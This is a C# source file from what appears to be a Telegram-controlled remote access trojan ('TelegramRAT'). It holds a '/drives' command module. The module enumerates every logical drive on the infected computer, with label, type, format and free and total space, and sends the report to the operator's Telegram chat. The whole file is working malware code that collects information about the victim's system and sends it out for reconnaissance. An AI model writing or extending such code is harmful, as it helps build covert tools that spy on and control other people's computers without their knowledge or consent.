using Telegram.Bot;
using System.Text;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.System;

public class DrivesCommand(ITelegramBotClient botClient, IBotNotificationService notificationService) : AbstractBotCommand
{
    public override string Command => "drives";
    public override int ArgsCount => 0;
    public override string Description => "Show all logical drives on this computer.";
    public override string Example => "/drives";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            StringBuilder drivesStr = new StringBuilder();
            foreach (DriveInfo drive in drives)
            {
                drivesStr.AppendLine($"Name: {drive.Name}");
                if (drive.IsReady)
                {
                    drivesStr.AppendLine(
                    $"Label: <b>{drive.VolumeLabel}</b>\n" +
                    $"Type: {drive.DriveType}\n" +
                    $"Format: {drive.DriveFormat}\n" +
                    $"Avaliable Space: {string.Format("{0:F1}", drive.TotalFreeSpace / 1024 / 1024 / (float)1024)}/" +
                    $"{drive.TotalSize / 1024 / 1024 / 1024}GB");
                }
                else
                {
                    drivesStr.AppendLine("<i>Drive is not ready, data is unavaliable</i>");
                }
                drivesStr.AppendLine();
            }
            await botClient.SendMessage(model.Message.Chat.Id, string.Join(string.Empty, drivesStr.ToString().Take(4096).ToArray()), ParseMode.Html, replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
